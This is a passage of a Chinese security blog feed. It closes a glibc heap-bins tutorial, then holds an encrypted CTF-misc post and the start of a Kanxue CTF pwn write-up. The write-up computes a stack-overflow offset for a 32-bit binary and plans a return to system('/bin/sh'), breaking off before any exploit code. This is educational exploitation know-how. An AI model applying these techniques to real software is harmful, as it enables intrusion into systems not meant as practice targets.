bin中没有合适的chunk，就会把unsorted bin中的所有chunk分别加入到所属的bin中</strong>，然后再在bin中分配合适的chunk，bins数组中的元素<code>bin[1]</code>用于存储unsorted bin的chunk链表头。</p><p><code>Small bins</code></p><p>      <code>ptmalloc</code>使用small bins管理空闲小的chunk，每个small bin中的chunk的大小与bin的index有关，计算公式如下：<code>chunk_size = 2*size_sz*index</code>，small bins和faste bins的大小有一部分是重叠的，其实当发生Consolidate时，fastbin中的堆块在一定情况下可以进入到small bin中。</p><p><code>Large bins</code></p><p>      在size_sz为4B的平台上，大小等于512B的空闲chunk或者在size_sz为8B的平台上，大小等于1024B的空闲chunks有large bins管理。Large bins一共包含63个bin，每个bin中的chunk大小不是一个固定公差的等差数列，，每组bin的数量依次为32，16，8，4，2，1，公差依次为64B、512B、4096B、32768B、262144B。</p><p><code>三个bin的大小对比</code></p><p>      如下图：</p><p><img src="/images/136-14.png" alt></p><center><font size="2">图15</font></center><p>      在讲完free相关的知识点后，我们应该清楚了，在free我们申请的动态内存后，系统并不会及时的收回，而是将空闲的chunk放入对应的链表结构中，等下次再申请相同大小的内存空间时，就无需再进行系统分配，而是直接将空闲的chunk返回，这样就极大的提高了堆的工作效率，下面我们通过一个示例代码来说明这一点，不过要说明的是，因为我的链接库是用的lib-2.30，如下图：</p><p><img src="/images/136-16.png" alt></p><center><font size="2">图16</font></center><p>所以在分配chunk时采用了tcache机制，关于这个机制我就不在展开，只需要知道<code>当一个Tcache链表装满了7个，再有对应的chunk被free，就会被放到相应的链表结构中</code>，示例代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *c,*a,*b,*d,*e,*f,*g,*h,*i,*j;</span><br><span class="line">    <span class="keyword">char</span> *o;</span><br><span class="line">a = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 1</span></span><br><span class="line">b = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 2</span></span><br><span class="line">c = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 3 </span></span><br><span class="line">d = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 4</span></span><br><span class="line">e = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 5</span></span><br><span class="line">f = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 6</span></span><br><span class="line">g = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 7</span></span><br><span class="line">h = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 8</span></span><br><span class="line">i = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 9</span></span><br><span class="line">j = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 10</span></span><br><span class="line">o = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 11</span></span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"><span class="built_in">free</span>(c);</span><br><span class="line"><span class="built_in">free</span>(d);</span><br><span class="line"><span class="built_in">free</span>(e);</span><br><span class="line"><span class="built_in">free</span>(f);</span><br><span class="line"><span class="built_in">free</span>(g);</span><br><span class="line"><span class="built_in">free</span>(h);</span><br><span class="line"><span class="built_in">free</span>(i);</span><br><span class="line"><span class="built_in">free</span>(j);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>在示例代码中，我们一共申请了11个300B大小的chunk，释放了10个chunk，按理说释放的前7个chunk被放到了Tcache中，因为是300B，所以后面三个会被放到Unsorted bin中，下面来验证我们的猜测，结果如下图：</p></blockquote><p><img src="/images/136-17.png" alt></p><center><font size="2">图17</font></center><blockquote><p>有的同学可能会对上图产生疑问：<code>Unsorted bin明明只有1个chunk块，不是应该有3个吗？</code>是的，的确是一个chunk块，但是大家看一下该块的size是0x3c0，那么就是<code>0x140+0x140+0x140</code>的结果，可以看出，本来三个chunk被合并了1个chunk，这里面涉及了<code>Unlink</code>机制，限于本篇篇幅，这个知识点就不在这展开了，有兴趣的同学可以自行学习，我在后期也可能单独拿出来介绍，因为这个知识点在漏洞利用时还挺重要。</p><p>还记得前面学习到的prev_inuse位吗？在上面的Unsorted bin中我们就可以感受到该标志位，如下图：</p></blockquote><p><img src="/images/136-18.png" alt></p><center><font size="2">图18</font></center><blockquote><p>如果标志位是1的话，那么size的大小应该为0x141，所以在这里标志位置为0了。<font color="red"><strong>注意：一定要明白只有在双链表结构中，并且发生Unlink时，标志位才会发生改变</strong>。</font></p></blockquote><h3 id="font-color-navy0x05-总结font"><a class="markdownIt-Anchor" href="#font-color-navy0x05-总结font"></a> <font color="navy"><code>0x05 总结</code></font></h3><p>      有关堆的入门很难，因为我的知识有限，所以只能先帮助大家了解到这里了，而且也不能保证本文没有错误，所以还希望有兴趣的同学可以自己再去看看其他的资料，自己多动手操作一下，以帮助自己的理解，谢谢！</p><h3 id="font-color-navy0x05-referencefont"><a class="markdownIt-Anchor" href="#font-color-navy0x05-referencefont"></a> <font color="navy"><code>0x05 Reference</code></font></h3><p>[1] <a href="https://zhuanlan.zhihu.com/p/24753861?utm_source=wechat_session&amp;utm_medium=social&amp;utm_oi=843456231229227008" target="_blank" rel="noopener">Linux堆内存管理深入分析（上）</a></p><p>[2] <a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#malloc_state" target="_blank" rel="noopener">Browse the source code of glibc/malloc/malloc.c</a></p><p>[3] <a href="http://abcdxyzk.github.io/blog/2015/08/05/kernel-mm-malloc/" target="_blank" rel="noopener">进程分配内存的两种方式–brk() 和mmap()（不设计共享内存）</a></p><p>[4] <a href="https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/" target="_blank" rel="noopener">Syscalls used by malloc.</a></p><p>[5] <a href="https://stackoverflow.com/questions/30542428/does-malloc-use-brk-or-mmap" target="_blank" rel="noopener">Does malloc() use brk() or mmap()?</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;li
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>CTF-misc类型题目总结</title>
    <link href="https://muzibing.github.io/2020/07/12/2020.07.12%EF%BC%88135%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/12/2020.07.12（135）/</id>
    <published>2020-07-11T16:00:00.000Z</published>
    <updated>2020-07-25T03:10:50.828Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="d4808b5bdac6aecdfac0c4ee04e40320e3d7d62044026298eab971ba5854aa80">c0b876c68ce8db4db0f2c5b16525afa2120afc55a2908d3322993c0be48c66eea98792901880c8466344c44217b8155245b9c97fbf56caeec538fba2091d2fb1d44e09e20b8cdbdee5be6350e1ed3a9ec590acbeffabf613ab20db6d5c1cb38b57ffc0ff870bd64a59d98382f942ba3212e7f7a5386a19166af01f12a34921daa0f3f6da3f96aea2bfac19fffc6650f573c5e9e7d7c215111b530660463f3bfabec4e27c4232e739ec05a738e8cee95d24780134dd31c6a366ca0cc82e18c9e5c87d52965fbe10fd5579b033df16f0acd7f02f5711f2a73bf56ff93fab2224a5404fc63eb0fd6fa525127b5486f3c221c47752020457ad08b22c4424191553667b97f515f47201f5b325e5ae36af9d830cc996d352c2e9807b009af628ada336576337d32a5a0a07a490c1820e59ffa3aa8a9ca27319188efd967ca8a67582b64ea9628a35280c65088f521629e399a3f62680b2beb3550df265af60538193222ed2deb595fdf842a46ccd6ece97b8869c29342ad243cd805350ff135e2d6d7ccd9e34cdddc1ca5c34139f048db62ae75ca268ad9efba9526a838ae863acaccb124e3f219283575958588b48507f9da915657e310226013170f9ed0003b8674fa9f326c36693ea57b1dfa57268d6858c80a56cd07d6ae8f6cb65fbe11b8730bbdb44ef12e6eb32e06a31aa543452b3d00e27b76541e210bcbe9486bcd0c01753a76782a0a4552878bf6279bdfcd254d2533e89bc2352f8b6027e6501a973e65781964c58be7e776c39e01aad805faef40226577b75df9285dadb98f88bcb5ab5ea71b9c54693e8f212c57a2f71f3eb1774577ccf9d2e65c3e1cbd64243a39a417506cca5e08632a1d375fbc8bca80c24e48ed272ac0c6adc9ac1e34be234519540865895d2067dcc2562e7b881fdd1923e4b1b2e6cd3e972a226423fa34534f9a19151d25cf4fd2f2e58020585d13f826614055f39d67ad4f907056c68cc6c2cba4c7a90f24965a5b940b130aa0bc793c8de0509a4a2beed27253f7e2f835c565879b422932bd4a871936626178daf9569242d79180cd45d3572c805867dd10ccf5fa66a23efb3dd609032f4389394f7935d5ad337461899e98e672a241aa457718c8645530a3db92706150c6e000f51df64c070e836ac4a27a19672a798c2451a0d2bcdcb64c70450875d96e4f8847edd69aea2d605385f624379011c8669693cf85ec44c6ae53ac4535f430a85e061304cd5d449af361dccbc9044d6781664e87aab78067113a88bfad750c63918ec460b06835a1fa60738b1818ad1e9e790a94c45fd89f8e2f13231fddc150eb61ea5ca58090142ddf86bc05b7185748b0bf939131fff34b6d70ba5fcb7dbb8d25b12a3b6a6ca5d22c86cd63ade4fb765591ba43fe42b250c4371e74e57389adba4297d1dbb855606e6be2124fbe0d53e7f424db5ca37c8c61d413f5ff9b5daf6fef0af6906256ebc3c648539b9b94cc11d0bc4cda758955cda10053fc923d1fd86259e6c3bb5367924ebfe8983e7191ff67379b418662a858070807f963fe6c6e4a2fa8cc5fa6088900eaaeb3f63ab031ae184154e1781a8601c59cb864fbdfeb5833b43b621268842133108e21aaacfa88462387187b9794f67443ccef38d30a41f794867b1b289a8096947b36c5281e6f861eabb0ce10578b69710fd28c19472d9ef1a7c59086c0658b566a9ba89c1e4778196e52d21af6d58f53bec1e858024932454556b2a2bc2e44a19e50af587cc7e71ffff766fd64cd6f1cc59d46c978d0ada0609a0ee1fb8952094d64567cb887336b3d696a3bd5703554db3befe697a61f38f92534fa2fb87a02ea3aa1441dbd495981c2dd8266a7d961ca92c10c25c3d8ae1288047e0c29914e55320cfd48e7369572e0116f31c84e9862a50e46dc390a35e25920de3f1d00e327da087ae547b0a1ac8c47ee5580ebba876e01036f07cc32a35b4010306096f876da41a8c7d9be239221587153d6b813b91b7ae0b83424e0469e7832110f6b3ab09a2268595e0f23303d52f1a5e92804b19bac1d8a80c81f12f4143b57e8a20436fc9534f46184268633fb12de2c98861e5b441aa78bc0b661c0242eba907257403488bc57d0a95cb485d011969bf051bcc896595d2bc661deb4eb0d3d1bda071db274fefecc276d96058981c152fafd6f457a4f0214c8ddefd12addbc8963c7500c3e824ca3a853bbe3979b53a5a5b5fa7583efb24268bf9627999cdec41c0ff55c500c134e44529b1f8d7a13c799f6be08d9ea26f5a09f076bc9b78cbb0e66997c7386d68a2b4110329833f3e47d247b5482facffc65526a680f46c9f0f0100fb632616d1ab41cbf6cc597587b619e591e25594661b2df57644a3183bda14f9df55175d3717f10ba4b8580fede394ece155f59b6e7caa057a8588e7d34ee3d901f5a42d27bd4990a4eefc0e4ef63a2976d8182d1fa0acd04901e223a772ffb24d4a50542d1eb5a0cead0f0aea48c7da58865de278a353c9dbc217cf6a268c2f032a17ea23b4e5c397c58d416c188e73b81c69e17234890ae4d13cc9f2576840a7825f6182cf31549e5a7873493df5bced8e32b2c38780bac7546b08fe925fbf647dc10afc5660e182d488663aa02f868a9fb4247e8a701c63f9f0125b68395736e969ac6bea844b8bcff43ce8f989d9ee50885c1cb1a01eb25ae70952f8e065528480897d1034cec516bc725d235bec8cdaf51fed1577747977434e4e78869bc64ddbbcb864a7009254754b7aac4dfaf2236a7554b4f9631eae7b9b1207f3af63372f9a735b2a1539b59980ee370902bf51b9877e41f886b2f5fbd59ebb40f894e51daea58ba5b829953f620a51536afdf3030437c804a51321909d2284eeb32391a782563aa12854a5f3485d3389f2bc712bd046db50959b404ae68a538bdf377c32a61f0f41b9d94ba67cdc6ab690e76719fe82b56f31ec4bfdd57785b72382c284460077159affab8259d98c56084a5277a914347ad501040fc24d9c87ddac472fae2ecb0ad80bbe3325410748c2b582917dacec39533c3e09e7e6f0ad35cc084d1029becfff8d6d9a676fc6f97a8a0b38daf1ded848a3c649c3ec62f0e78f2d1a225dd40eb0230f733eda044ad42a4fa83499ed8eb24ece4f88cd2a089988c8433e559508bde79759f4a1b4d9c17faea4590b4f95db545996f08cd631bf6e6b2b6984b1278947f40bac178b035363589c69e5ecb9f71bb03016052e73eef2db1f83c669b64851f69aeb2d46f8eea757d18f4c824c180f9f76d61d94b9630b8bcb7ca81184a9e37996af28d107aad06db4fe3b7af22c815ebd5315e0b9e3816dcefa40b2b6c0d996f1160879a33b19f780e20f50da19c8d70c03d12fe975950ff6b19378c0156801f995b200ac281367178941d935e25813f39595f7c26ac3e30de4cd41526ca8e574314d01872eae12e7b08f0f4a26e9db12c8ea2952f7e5e5e6fd16ab29766a70c8bf8b095ef32c24a2679037ed499535546a8a3be55b79eb84eabb95773f3f85514c2d7f786b0b9c7f530fa40d2767b256d1182ad906625315a666af493a24b1ce665654c97d7e7eff1271c657e9c2a73156921e9daa3777d7c63da4f9be2e12646dbca48c42dad41b0af4211da774e63073088a20e9dca40ec2ce0ebec932521f79cd125d48c5917febbe583db430494b792ff57b906f0fe412cd333738122ee0749ef42b731df7660d3015646506d6144b238fb3d519ae4e62f60c143e83155a8daaf202ee5c46a0e20bf46ee1e169958f33ae0805fe8e9efb1c5f86040c6978104dd85c2f1c36927d1bd4fb82472190c7d7f35bda89e6f46181724c651ff7f3c2624c51646ace66fc90e48d7c9255888158e7f01496fe732396c402f6886cb44697d083cea93c7ad171eb8aa192e9ec6d6db5b9057736ce9d26e49a350be78157a46c7ba62c166445397cb064f139e4f207281d7aaeb32b155382032e78c5f4a8554619e3f8652e30aded3beaced7c4c0c38a1bd74c688338f143b9d34e88af52735341ca58c8b264db061dbffbfd849e6a607db83ca94a85e753f3c5e1baf698c2940527b7008f33001567a0d411e079b61655d76de17e71bd78e40dff671cfb36465cff5329839b4495a3be3013d52f02de3d15a7a337d3dbb9fb7169f374d3c07554ff0699b9c599051583aeaf47ba9030f8b7116d7e299930e31663b09344d04c103f7c3c6389ede4def35ed42602e5ced47161e38bc40691bfb694bd82b12187445350bf8b47a78fe233d67289d6a86aa935eea114946a5facf5f489ac3478a1f4fb74a6cbde9b027d952274fdb3f892762a60ef80a4e8a6d7549721444b7cd401e365d8ad22c3cc740799f6822cf3fbd0f9e1cceb12557cceba1ee5c4f042768abcf7a0520d383618ff0b9ee8698638bbd47eed91fab6175cd4d6359df7fb7e4e80fe6815cd385007d726ec73ebbf3520543c9274f0d8833c92a638dc51e83b7765deb577c7a41f589a56e8f899e5c1aa4c12e6d4695902ff790cc27eab7f9f67c9019c8a3fdde309fabb580c532b27047b1c2a154f1b9dd60aa4e758782776a26d5379d1051f93650fd56d0b71e34a692d2c2da91bcf5c349c002297d9025895fdb9288236f36b18a9f27e2e66209037cf5753029d0d451edb5b7aa7ce487fb6387b16e2875f3c08fbe9051b6eb432afd4da58f872441b717dcb1a0485429d7d58613adebe05f4f4c6782d8492e4d10e721f5dbe37b4bbc5d8aa3ff665ff704e0d845be138fbe86c7806788b3e2f67996c35b9a862ca9623a0fd9b554e8714192163c7d4f7e5e3db518345919d7cc925aeaae19226e762c6eb59dd3c5dc1a802990843f085d215b5c5d523fcfd68d7895b40167dc2aaefa7eec4f068fb60d76992733f3d95d594ce3e034308e89d2b7776bdf3adea52a33c1ec1f85a87a0c00dbed26ee548216cbfa8ef34e1cf49f745e4d4780c7773aad8e2ffcff4baa80a639c4bc1035d663417c10388c0d77abe8bba9ff738e7c4cb216d31c924e2438ef42841efe4f6771e4a8b19a847e6944d900752344b821500fdc3592621263e63cd8ac866c15df16c4768a3b51a44c53eb6f5b6a2191dd70b9d1974cc886282e68c385442111d7ff9b970f5b60bb9a84b18c5f931194286d62b7e22aee6acbc34435d1f796191a9da609dc40535efe89503bbe16b0dafbc47ea706ebbe17bf748142b68c29b128b9d9cda6dcb89d748a5577ad24230f2e2d961ea354d8660d2233cf9092845674c9acd7e63e10afd1796fdf098f9b08ff1b920698dab2856efd603637b485a5053c6a5e314827a4757c33f6eb8a106bdd61e0dc77f684a9267f14138e5e8d841c6a8ec3b9bd5663ca53bb10cb8f8bd03815b1ec07d41ff3d478be5f8ae9cb73f60087be5c40cf3a00000ea2353212b2e120e9e8cd620518d323958f13d97029a82daaafdd97e581e7096f9076d06d7b7a3e7cf37c27f292894e25b1a131a6ad4ef780cc6672b3071176d0feb7a89ee47929dfddf4cc3908545d776d41eecd96fc8d2b05714b6c4063e75ad4b0da0d2a45585e3adad7f8842a0ac0b2c3e2fcea6c0b6df7d6eb64424e703e3132bf60e7c7531a0e8ea5055107abe9571ba81b5b6d67df2b515d2fa8cdc5ff17cfe3cc1f4bb711adc5de7073d3963211ee8a95bdb4718183fd672f6bbd24e51ad8bc32c469c2bd82f6c54e2dbd3a600525292c4349b146fef766272700d4869fe7f5a45f853ae1037c84e2afc7d6f47c6cc710fb13546537e80835ac296a419b1310e84a607974cc692b628a2b8cb7e859eb3eee610ab4ca6ea8a4bc6a019457dc4a347220547160384f33db52b512cd8645506fb5b5fdac2927541604202b8d08f2a0c567432ae718206161dff5a9919f2e66a837122e6bedd712de43e7d9620ea68e7e224d7240c6ac50d4d7602bfea7f7d460f5b48b21d9a2c536fbfe27af900ebeb80b4e1717fe08b083ee4c1f9244514e0f54391fa4448af14bd81be95afaf16f4f0cc749c5c5e9b830a549937ae610b86eed9582281391d32ca1677cf038bbab0b37489835be58639b9e684cd629a4c88426392515cf1010c34434b48ce48895bfc8b6da897916aedbe14bec14aa4b70a73c41c33706050e4fa5bd1d6c07847603f060bb3a4ac4a2dce2a2866343d8e9681432d28e59048255cdac0d1a12b881e04ff7ef59f1b3bd2cf84673921f1468fd481a7b06fd6fd053b1e60c6aae15d2132bbd33c76d0ffcda5518a784bd283927d9c3a328916b5c4eb9cbaa16cfa3f671237b80ada9943f5dc8b19b571a56bbcd517b3ee7466938607d5f8e4dad802c2cd40594d95a1f5ab793b7d2104b46e50c6595e31fe5f738be75e13447ee0e36bcc7dbf604d454d02e13165dd376dbde4fbe039d6a158fd2971336833591ef6fe21acca48283d227605d23e59ff3b7018e60529de68d8e03d9961acd8ad480b3cf7c2a8240961e9b5cbc5d9c22e2ce0ed5ad2539b79972a306a7771ebb0c50e73324676f77b1fd58da48334f77498e1d0b6f4233bfe95ce8a5d4015e97f957a9d12698bc5ed9970d44eae2d029733561e0299b8103a1f377d8c2043ae469f30b0b542bcee169cddf793eb2183e391fd7fef05d4cb54f2f73e5c73944fcb4ee35281473ddd1654c41dfc9e8eb5bad04655c35b1cc2bba3bef092c9cacd0fd61e704bef63238d2bb6a3c54c816be6651e00148989b4f5dae84619b9d536d8237cfda19e9d65653f16e116bd836ba8ab9809cd3e1f3673122fd196ed114e98ac8873c4c1659949ca136835476c4da7e4abbde04b848ebc8a1f7ddd75f19641ed99e5047fdd76ab0f8990f150f60d59257c6d90474f3a58e814356c06a4079340f05b1544a563ed05a6ba6484f31cb3a399a63168219b5d938fe65fdb1fa4b8ecabac707cd59001875f99d568ff707af1715c2f070b192285e7dd9c043cd80044ba6adc0c9fccc12429bd7afaf8d32dbd17b116bea2611c56765f11094c03106ff1e147b6217ea4284b412633485d1d21cda5c4f800f3cc6a43c9ac0066dae259620aed33bb2530b8c4e8ae926475d57205c60edb63210d544eb89510e4380dc932d64e12becf1102c95913003c2e75cb0578e34074bd3e7835fdb33153dc52b4883de7a786763f14203abbe197658a755e2edea8842780b21a3ce7121d23b25170b9bd25b8a676bbf1bc1cbcfe76cc586842586e98b964cdee80ffea1b442c6945673b809ed95f55c8c1d844fa6a34f2396234956f60a9be01ceec7799955134640802d1a8790b11b22fe745f08022a0a1bd765d1d38b75ee02ccb370c321ec9271771c77c22e2c4d7140886858e26314f54eaf301c83b7b04dc3f92af6b5a05351db37b68a0587b1e9ba08a31190090d16c5a4f496542dd69838324f199bad09fec94ac57d5d9669f12efcf9852fa442301091af8bb7f303d7ef3e749075d8ff0ad419d4a00a3fb2bd0d2f1c9482f669a86a066cf27379958ab6b45cd6eac00c616d3e9f72975f1fdbd57244788b144d7a7547fe13fa56aed1559e8136f959f0aedc99a046789d6cb01a183814cb71f7e17663a916017d866b26f588fab4f00ab864d67f0390d5d6a87d57b6d041a4ec78380992f43946502e49d02d5a8f9edc11526271b2029dbfc146d9b67aa2864c624a557323717c301363064a462a24ebfb03ec8eebccd7641bdcc803ef8299f6fd0a606b19799de59515bfe2c50a021370bfa1cf5885306b8303b4bc564f4cc21d82af7f762b24a59cc32dfb42680d9cf93157d6c0aeebaf4afbe2d72aebc135bf35afea40b9c4e4aec1a1a958a74fe99e528acdee887b4ed65ba75e8d6c9b2662789202f4576c3d4658db705a0219d9e3c78801929ce8eaf2045c821c6fd912f7aafe7a9016f0f9a56609ddc940f16f4542bb8888da8f5db2d2a05350bb70d5dcb6f76d9c294388157a6470878b31e7f9c2692143beccdf920f4d9cac4f1957dff6385af5fb63fb97b31c64cdfa61e6005e8d233e47c1a56e7a87fa57b51c8118cc1f8834330c1c56bef7cfc19d102476345150c40d806525ff3f05ca6ed68133ddacaea52885f7a490f7fb1443384b1ad469f9237dcb603a9e07e738c74fdb4f40254fefb12cde3f58c2943f9388ef04355bcca2d93007a7702de6453a5b62478ea32813140ca7e426d1084dd0359046fb1b593a9eb320b148b7ec5c19f8a6ae732c43414fcbbd7099d591ad91f2477862145e1eda1f5414dbe60adc5234e58aefb67f815b25bb9a5e9bfde1daf641a29e9f6f756da23337839e81520090ccfab7590227054d73b5dca0a0d4019f83278825cbb04fd879d6586f54e7b7991e1ef97648c51461fd6def785bb900cac9e1f12f5f991d3f76e018e38e7df9baef49ec6625d56e549756589020e8a0802fc72f1666350413d0c69592337624cfbbbf05ec4d5f2febe721ff238f0018ca703de1ac8e10185e117ac0f423b6e5b8c3b012d7dc5532f11ad7233abfadb7ba941a9835818250ab18be65687dd2ed30b41032dfcab5ed039d60d3ff339d5a278f87e13cd9b44aa39fcb754e280f306c503d2c58ffc2cf4462e4a72406f6cc5fed6b6d48536cfa5a909c7fd1455249d1c58640a69ee8efe46038f9347dba3fc21fd436a7c6d92209e3d495d9fc3d615d34ca91bc2676b7679093cff2b86fc0d8711238c74532a534773c691eb6834761a179249fdf81551c10b22f4b6a86db4931002aa9227ca7818b722d8d9e8a8679d61656656bc88a5ef9b93244f32f7de4a140f1b961ee9d95c53da5a6085e679b4b7eb83b68073ceafb01ffc4327239e4d7246a640b84d8391d42a302b4c9d9ed1790ffcad19ab6202779b63ba1bb03f86b6316c29568f65e4f5b6c68d7361845e12a0df8efacff32e13afa4d753449ed6c36faa4918341a31d6ca62894da3f315f9afbe50d17015054e1a2a3845c924ee8486985e87727bb02c90544a1219ff5460500875f2e36549b7e57209fb80d4389f9d0c23096f55a98285921c3a124aeeea04a3f333df38c195c5690b07fb484c367ac23b6bea8a1e3a3667d35c155808af2136a351e21c043e949cf6dc9dd9fc51ca92c6e988387ab58a2603c2ec0c4b5fdc0d9c2984201af251cd74e7f8097dceddb9bdac1aa3afd7744d87221fb0860ac743a9e42ecdc44dcc47cef2ecca9f41e8f3f92f4a423abd18808c776f126e0f498c7afb662d5972593f505c0de45a9eac5529f9648b82de2e8e3cf2722522c8430c560fb3b67a6c9383985a5cfa6e1639e0b02e202ec78d214a0dabc9bd4b21eb9b8de63a50e577fe1eaa61f1e4ca1495d7ca7a235527251fa6f75e1b83a1e619e88845b66f3f2d47ca632569c6f911b66f8b81c4ac2447b7d36b765651f0209d7b4f5369c215ad40ab21c5b8c34fc90b95ff67174e21f82b72946a73458c7d75a25b82c1bf638022b20576ae70ba86b5812a5f24dcdc8d68d358f4e48003e912f37c0a9014e3319646bc3515b4ada08a32aff05fb21106522087f0cf7b58c6c2ded960dec280fa806c05185fc8dabd9767a28377193418c0738c62d8444bdaa06a6c610e9181eed5f9cee418f58310b59462871df9c21a52a7a7c97ddb2de28364658bd029bbf170f233d16ac45b56361b9010ef848815c0f166efe80defdcb0a86be8694a8b7d7d933b393a8c42e338d710bddf87ea925e79065abfa538c3f35a0dee39bb51178d49720a38c0fb8977f1230619ea96ed59518115d91e7bb7f06acbe6cd1e0572954e571e28133b3f0db20a5952ff2bcc35001205119b847a11af1b82fcb8185d65c7d185f5946d24321224a50f50cc0215f5f69c89e729fa943fb290bbeae40e1bcd8923ff817253149733512b6ed9f4d465f180a0bfc0f5f90d6c6aff83179b57dc860766ba63aed663e8c6370ba61f943492eb135cee76abe9d7b029418191a39cc17774910a2d3d6e412ed8c83fae94050aadf949ba5c49ae7526d99a109b65efc35dc9b3073a6188f8</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>【看雪CTF-pwn】一鸣惊人的栈溢出</title>
    <link href="https://muzibing.github.io/2020/07/04/2020.07.04%EF%BC%88134%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/04/2020.07.04（134）/</id>
    <published>2020-07-03T16:00:00.000Z</published>
    <updated>2020-07-04T14:37:00.456Z</updated>
    
    <content type="html"><![CDATA[<p>      这道题目真的太坑了，不过也给我提了一个醒，就是<code>在做题时不能对IDA pro反编译的伪代码过于相信</code>，在感觉有问题的地方，一定自己用<code>GDB</code>调试一下，否则就会陷入一个自我反省和懊恼的循环中，下面这道题目就是，下面我将用两种姿势来获取flag。</p><h3 id="font-color-navy0x00-准备工作font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-准备工作font"></a> <font color="navy"><code>0x00 准备工作</code></font></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># file ymjr </span><br><span class="line"></span><br><span class="line">ymjr: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=4f13f004f23ea39d28ca91f2bb83110b4b73713f, with debug_info, not stripped</span><br></pre></td></tr></table></figure><blockquote><p>可以看出该文件是32位的ELF文件</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># checksec ymjr </span><br><span class="line"></span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/Kanxue/1/pwn/YMJR/ymjr&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><blockquote><p>该ELF文件只开启了栈不可执行保护</p></blockquote><p><img src="/images/134-1.png" alt></p><blockquote><p>从上图的IDA中可以看出，gets()函数中的变量<code>v4</code>在栈中被分配的空间为<code>0x64</code>，但是在后面的exp.py文件中构造成功了，但是没有成功得到flag，于是我去gdb中调试了一下，如下图：</p></blockquote><p><img src="/images/134-2.png" alt></p><blockquote><p>从上图中可以看出，v4距<code>esp</code>的距离有<code>0x1c</code>，esp中的地址为<code>0xffffd860</code>，那么v4的地址为<code>0xffffd87c</code>。这个时候ebp中地址为<code>0xffffd8e8</code>，那么<code>v4</code>与<code>ebp</code>的距离为<code>0xffffd8e8-0xffffd87c=108（0x6c）</code>，示意图如下：</p></blockquote><p><img src="/images/134-3.png" alt></p><h3 id="font-color-navy0x01-姿势一font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-姿势一font"></a> <font color="navy"><code>0x01 姿势一</code></font></h3><blockquote><p>直接让返回地址跳转到<code>system(&quot;/bin/sh&quot;)</code>处</p></blockquote><p>     